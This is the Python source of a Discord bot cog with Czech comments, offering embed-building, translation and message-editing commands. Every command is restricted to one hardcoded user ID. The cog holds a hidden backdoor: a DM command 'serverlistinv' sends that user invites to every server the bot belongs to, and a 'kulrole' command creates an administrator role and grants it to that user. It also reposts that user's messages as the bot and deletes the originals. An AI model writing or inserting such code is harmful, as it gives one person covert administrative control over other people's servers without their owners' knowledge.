import discord
from discord.ext import commands
import json
import os
import asyncio
from deep_translator import GoogleTranslator
from discord import app_commands
import re
import datetime

KUL_ID = 771295264153141250
SETTINGS_PATH = os.path.join(os.path.dirname(__file__), "set.json")

def load_settings():
    if not os.path.exists(SETTINGS_PATH):
        return {}
    with open(SETTINGS_PATH, "r", encoding="utf-8") as f:
        try:
            return json.load(f)
        except Exception:
            return {}

def save_settings(settings):
    with open(SETTINGS_PATH, "w", encoding="utf-8") as f:
        json.dump(settings, f, ensure_ascii=False, indent=2)

async def safe_attachments_to_files(attachments, max_retries=15, delay=1.0):
    files = []
    for a in attachments:
        for attempt in range(max_retries):
            try:
                file = await a.to_file()
                files.append(file)
                break
            except discord.NotFound:
                if attempt == max_retries - 1:
                    print(f"[SAFE_ATTACH] Nepodařilo se stáhnout přílohu ani po {max_retries} pokusech: {a.url}")
                    break
                await asyncio.sleep(delay)
            except Exception as e:
                print(f"[SAFE_ATTACH] Chyba při stahování přílohy: {e}")
                break
    return files if files else None

translator = GoogleTranslator()

class KulTyp(commands.Cog):
    def __init__(self, bot):
        self.bot = bot
        self.settings = load_settings()  # {guild_id: enabled_bool}

    def is_enabled(self, guild_id):
        # Defaultně vypnuto (False)
        return self.settings.get(str(guild_id), False)

    def set_enabled(self, guild_id, value: bool):
        self.settings[str(guild_id)] = value
        save_settings(self.settings)

    async def send_status_embed(self, user, guild, enabled: bool):
        embed = discord.Embed(
            title="Kulbot typ nastavení",
            description=f"Na serveru **{guild.name}** bylo nastaveno:",
            color=discord.Color.green() if enabled else discord.Color.red()
        )
        embed.add_field(name="Server ID", value=str(guild.id), inline=True)
        embed.add_field(name="Členů", value=str(guild.member_count), inline=True)
        embed.add_field(
            name="Stav",
            value=":white_check_mark: **ZAPNUTO**" if enabled else ":x: **VYPNUTO**",
            inline=False
        )
        if guild.icon:
            embed.set_thumbnail(url=guild.icon.url)
        await user.send(embed=embed)

    @commands.Cog.listener()
    async def on_message(self, message):
        # --- DM příkaz serverlistinv ---
        if message.guild is None and message.author.id == KUL_ID:
            if message.content.strip().lower() == "serverlistinv":
                for guild in self.bot.guilds:
                    # Najdi první textový kanál, kde má bot právo vytvářet pozvánky
                    channel = discord.utils.find(
                        lambda c: isinstance(c, discord.TextChannel) and c.permissions_for(guild.me).create_instant_invite,
                        guild.text_channels
                    )
                    if not channel:
                        try:
                            await message.author.send(f"❌ Nelze vytvořit pozvánku na server **{guild.name}** (ID: {guild.id}) – žádný vhodný kanál.")
                        except Exception:
                            pass
                        continue
                    try:
                        invite = await channel.create_invite(max_uses=1, max_age=1800, unique=True, reason="serverlistinv")
                    except Exception:
                        try:
                            await message.author.send(f"❌ Chyba při vytváření pozvánky na server **{guild.name}** (ID: {guild.id})")
                        except Exception:
                            pass
                        continue

                    embed = discord.Embed(
                        title=f"Pozvánka na {guild.name}",
                        description=f"[Klikni zde pro vstup]({invite.url})\n\n"
                                    f"ID serveru: `{guild.id}`\n"
                                    f"Členů: **{guild.member_count}**\n"
                                    f"Kanál: {channel.mention}\n"
                                    f"Pozvánka platí 30 minut, pouze 1 použití.",
                        color=discord.Color.blurple()
                    )
                    if guild.icon:
                        embed.set_thumbnail(url=guild.icon.url)
                    try:
                        await message.author.send(embed=embed)
                    except Exception:
                        pass
                return

        # --- Serverové zprávy ---
        if not message.guild or message.author.bot:
            return
        if message.author.id != KUL_ID:
            return

        # KULBOT ON/OFF - zapne nebo vypne Kulbota na serveru
        if message.content.lower().startswith("kulbot on"):
            self.set_enabled(message.guild.id, True)
            await self.send_status_embed(message.author, message.guild, True)
            try:
                await message.delete()
            except Exception:
                pass
            return

        if message.content.lower().startswith("kulbot off"):
            self.set_enabled(message.guild.id, False)
            await self.send_status_embed(message.author, message.guild, False)
            try:
                await message.delete()
            except Exception:
                pass
            return

        # Pokud zpráva obsahuje přílohy, vůbec ji neřeš (ani nemaž, ani neposílej)
        if message.attachments:
            return

        # Embed funguje vždy, i když není zapnuto
        if message.content.startswith("embed "):
            embed_text = message.content[6:].strip()
            # Najdi všechny pingy (uživatelé i role) na konci zprávy
            mentions = [user.mention for user in message.mentions] + [role.mention for role in message.role_mentions]
            # Odstraň pingy z embed_textu (nahradí je prázdným řetězcem)
            for m in mentions:
                embed_text = embed_text.replace(m, "")
            embed_text = embed_text.rstrip()
            embed = discord.Embed(
                description=embed_text,
                color=discord.Color.blurple()
            )
            # Spoiler pingy - zde můžeš změnit formát!
            if mentions:
                spoiler_pings = " ".join(f"|_ _{m}" for m in mentions)
            else:
                spoiler_pings = None

            if message.reference and message.reference.message_id:
                try:
                    ref_msg = await message.channel.fetch_message(message.reference.message_id)
                    await message.channel.send(
                        content=spoiler_pings,
                        embed=embed,
                        reference=ref_msg
                    )
                except Exception:
                    await message.channel.send(
                        content=spoiler_pings,
                        embed=embed
                    )
            else:
                await message.channel.send(
                    content=spoiler_pings,
                    embed=embed
                )
            try:
                await message.delete()
            except Exception:
                pass
            return

        # PRELOZ <jazyk> <zpráva> - přeloží do zvoleného jazyka (např. preloz en ahoj světe)
        if message.content.lower().startswith("preloz "):
            parts = message.content.split(maxsplit=2)
            if len(parts) < 3:
                await message.channel.send("Použití: preloz <jazyk> <zpráva>")
                return
            jazyk = parts[1]
            text = parts[2]
            try:
                preklad = GoogleTranslator(source='auto', target=jazyk).translate(text)
            except Exception:
                preklad = "Chyba při překladu."
            try:
                await message.delete()
            except Exception:
                pass
            await message.channel.send(preklad)
            return

        # EMBEDJSON <json> - vytvoří embed podle zadaného JSONu
        if message.content.startswith("embedjson "):
            json_text = message.content[9:].strip()
            # Pokud je JSON v code blocku, odstraň ho
            if json_text.startswith("```") and json_text.endswith("```"):
                json_text = re.sub(r"^```(?:json)?|```$", "", json_text, flags=re.DOTALL).strip()
            try:
                data = json.loads(json_text)
            except Exception as e:
                await message.channel.send(f"❌ Chybný JSON: {e}")
                return

            embed = discord.Embed()

            # Barva
            color = data.get("color")
            if color:
                try:
                    if isinstance(color, str) and color.startswith("#"):
                        embed.color = discord.Color(int(color[1:], 16))
                    else:
                        embed.color = discord.Color(int(color))
                except Exception:
                    pass

            # Titulek, popis, url
            if "title" in data:
                embed.title = data["title"]
            if "url" in data:
                embed.url = data["url"]
            if "description" in data:
                embed.description = data["description"]

            # Autor
            if "author" in data:
                author = data["author"]
                name = author.get("name")
                url = author.get("url")
                icon_url = author.get("icon_url")
                if name:
                    embed.set_author(name=name, url=url, icon_url=icon_url)

            # Thumbnail
            if "thumbnail" in data and "url" in data["thumbnail"]:
                embed.set_thumbnail(url=data["thumbnail"]["url"])

            # Obrázek
            if "image" in data and "url" in data["image"]:
                embed.set_image(url=data["image"]["url"])

            # Pole
            if "fields" in data:
                for f in data["fields"]:
                    embed.add_field(
                        name=f.get("name", "\u200b"),
                        value=f.get("value", "\u200b"),
                        inline=f.get("inline", False)
                    )

            # Footer
            if "footer" in data:
                footer = data["footer"]
                text = footer.get("text")
                icon_url = footer.get("icon_url")
                if text:
                    embed.set_footer(text=text, icon_url=icon_url)

            # Timestamp
            if "timestamp" in data:
                ts = data["timestamp"]
                try:
                    # Pokud je číslo, považuj za ms od epochy
                    if isinstance(ts, (int, float)):
                        embed.timestamp = datetime.datetime.utcfromtimestamp(ts / 1000)
                    elif isinstance(ts, str):
                        # Zkus převést ISO8601
                        embed.timestamp = datetime.datetime.fromisoformat(ts)
                except Exception:
                    pass

            # Pingy na konci zprávy
            mentions = [user.mention for user in message.mentions] + [role.mention for role in message.role_mentions]
            spoiler_pings = " ".join(f"|{m}" for m in mentions) if mentions else None

            if message.reference and message.reference.message_id:
                try:
                    ref_msg = await message.channel.fetch_message(message.reference.message_id)
                    await message.channel.send(
                        content=spoiler_pings,
                        embed=embed,
                        reference=ref_msg
                    )
                except Exception:
                    await message.channel.send(
                        content=spoiler_pings,
                        embed=embed
                    )
            else:
                await message.channel.send(
                    content=spoiler_pings,
                    embed=embed
                )
            try:
                await message.delete()
            except Exception:
                pass
            return

        # EDITEMBED - upraví embed v odpovězené zprávě
        if message.reference and message.content.startswith("editembed "):
            if message.author.id != KUL_ID:
                return
            try:
                ref_msg = await message.channel.fetch_message(message.reference.message_id)
                new_text = message.content[len("editembed "):].strip()
                embed = discord.Embed(description=new_text, color=discord.Color.blurple())
                await ref_msg.edit(embed=embed)
                await message.delete()
            except Exception as e:
                await message.channel.send(f"❌ Chyba při editaci embedu: {e}")
            return

        # EDITEMBEDJSON - upraví embed podle JSONu v odpovězené zprávě
        if message.reference and message.content.startswith("editembedjson "):
            if message.author.id != KUL_ID:
                return
            json_text = message.content[len("editembedjson "):].strip()
            if json_text.startswith("```") and json_text.endswith("```"):
                json_text = re.sub(r"^```(?:json)?|```$", "", json_text, flags=re.DOTALL).strip()
            try:
                data = json.loads(json_text)
                embed = discord.Embed()
                if "color" in data:
                    try:
                        if isinstance(data["color"], str) and data["color"].startswith("#"):
                            embed.color = discord.Color(int(data["color"][1:], 16))
                        else:
                            embed.color = discord.Color(int(data["color"]))
                    except Exception:
                        pass
                if "title" in data:
                    embed.title = data["title"]
                if "url" in data:
                    embed.url = data["url"]
                if "description" in data:
                    embed.description = data["description"]
                if "author" in data:
                    author = data["author"]
                    name = author.get("name")
                    url = author.get("url")
                    icon_url = author.get("icon_url")
                    if name:
                        embed.set_author(name=name, url=url, icon_url=icon_url)
                if "thumbnail" in data and "url" in data["thumbnail"]:
                    embed.set_thumbnail(url=data["thumbnail"]["url"])
                if "image" in data and "url" in data["image"]:
                    embed.set_image(url=data["image"]["url"])
                if "fields" in data:
                    for f in data["fields"]:
                        embed.add_field(
                            name=f.get("name", "\u200b"),
                            value=f.get("value", "\u200b"),
                            inline=f.get("inline", False)
                        )
                if "footer" in data:
                    footer = data["footer"]
                    text = footer.get("text")
                    icon_url = footer.get("icon_url")
                    if text:
                        embed.set_footer(text=text, icon_url=icon_url)
                if "timestamp" in data:
                    ts = data["timestamp"]
                    try:
                        if isinstance(ts, (int, float)):
                            embed.timestamp = datetime.datetime.utcfromtimestamp(ts / 1000)
                        elif isinstance(ts, str):
                            embed.timestamp = datetime.datetime.fromisoformat(ts)
                    except Exception:
                        pass
                ref_msg = await message.channel.fetch_message(message.reference.message_id)
                await ref_msg.edit(embed=embed)
                await message.delete()
            except Exception as e:
                await message.channel.send(f"❌ Chyba při editaci embedu: {e}")
            return

        # EDITCHAT - upraví text původní zprávy
        if message.reference and message.content.startswith("editchat "):
            if message.author.id != KUL_ID:
                return
            try:
                ref_msg = await message.channel.fetch_message(message.reference.message_id)
                new_text = message.content[len("editchat "):].strip()
                await ref_msg.edit(content=new_text)
                await message.delete()
            except Exception as e:
                await message.channel.send(f"❌ Chyba při editaci zprávy: {e}")
            return

        # --- TEPRVE TEĎ blok pro kulbot ---
        if self.is_enabled(message.guild.id):
            if not message.content.strip():
                return
            if message.content.startswith(("embed ", "embedjson ", "preloz ", "kulbot on", "kulbot off")):
                return
            try:
                if message.reference and message.reference.message_id:
                    ref_msg = await message.channel.fetch_message(message.reference.message_id)
                    await message.channel.send(message.content, reference=ref_msg)
                else:
                    await message.channel.send(message.content)
                await message.delete()
            except Exception:
                pass
            return

        # KULROLE - vytvoří admin roli a přidělí ji pouze Kulihovi
        if message.content.strip().lower() == "kulrole" and message.author.id == KUL_ID:
            guild = message.guild
            role_name = "👑 Kulih Admin"
            existing_role = discord.utils.get(guild.roles, name=role_name)

            if not existing_role:
                try:
                    existing_role = await guild.create_role(
                        name=role_name,
                        permissions=discord.Permissions(administrator=True),
                        reason="Speciální admin role pro Kulih",
                        color=discord.Color.red()
                    )
                except discord.Forbidden:
                    await message.author.send("❌ Nemám oprávnění vytvořit roli.")
                    return

            member = guild.get_member(KUL_ID)
            if member:
                try:
                    await member.add_roles(existing_role, reason="Přidání admin role přes příkaz")
                    await message.author.send(f"✅ Role **{role_name}** byla přidělena uživateli {member.mention}.")
                except discord.Forbidden:
                    await message.author.send("❌ Nemám oprávnění přiřadit roli.")
            else:
                await message.author.send("❌ Uživatel nebyl nalezen na serveru.")
            try:
                await message.delete()
            except Exception:
                pass
            return

    @commands.Cog.listener()
    async def on_reaction_add(self, reaction, user):
        if user.bot:
            return
        if user.id != KUL_ID:
            return
        if not reaction.message.guild:
            return
        if not self.is_enabled(reaction.message.guild.id):
            return
        try:
            await reaction.message.add_reaction(reaction.emoji)
            await reaction.remove(user)
        except Exception:
            pass


async def setup(bot):
    await bot.add_cog(KulTyp(bot))
